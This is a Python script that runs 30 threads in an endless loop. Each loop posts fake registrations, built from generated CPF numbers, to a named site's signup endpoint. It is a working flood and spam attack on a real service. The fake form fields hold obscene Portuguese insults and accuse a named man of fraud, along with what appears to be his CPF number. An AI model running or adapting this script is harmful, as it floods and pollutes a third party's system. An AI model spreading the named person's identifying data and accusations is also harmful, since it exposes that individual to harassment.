import requests

import random
import threading

def do_request():
    while True:

        url = 'https://alveseyoshiy.org/app/Ajax/ajaxForm/cadastro.php'

        url2 ='https://www.4devs.com.br/ferramentas_online.php'

        data_gerador ={
            'acao': 'gerar_cpf',
        'pontuacao': 'S',
        'cpf_estado': 'RJ'
        }


        cpf_gerador = requests.post(url2, data=data_gerador).text
        print(cpf_gerador)

        data = {
        'nome': "me contate por  ",
        'email': str(random.randint(0,99999999)) +'@mail.com',
        'cpf': cpf_gerador,
        'rg': '21222222',
        'sexo':1,
        'dia': 3,
        'mes': 5,
        'ano': 1998,
        'telefone': '(22) 2222-2222',
        'celular':'',
        'cep': '22.222-222',
        'rua':  'VAMOS PARAR COM OS GOLPES EDUARDO APARECIDO BORGES 053.555.136-38',
        'numero': 222,
        'complemento': 2222,
        'bairro': 2222,
        'cidades': 'maceto cu do dono',
        'estados': 'rio de janeiro',
        'login': 'COMI O CU DO dono',
        'senha': 123,
        'c_senha': 123,
        'termos': 1,
        'direcionar':'-' ,
        'gravar': 1
        }
        try:
            response = requests.post(url,data=data).text
            print(response)
        except ConnectionError:
            print('erro, tentando novamente')
        
threads =[]

for i in range(30):
    t = threading.Thread(target=do_request)
    t.daemon= True
    threads.append(t)

for i in range(30):
    threads[i].start()

for i in range(30):
    threads[i].join()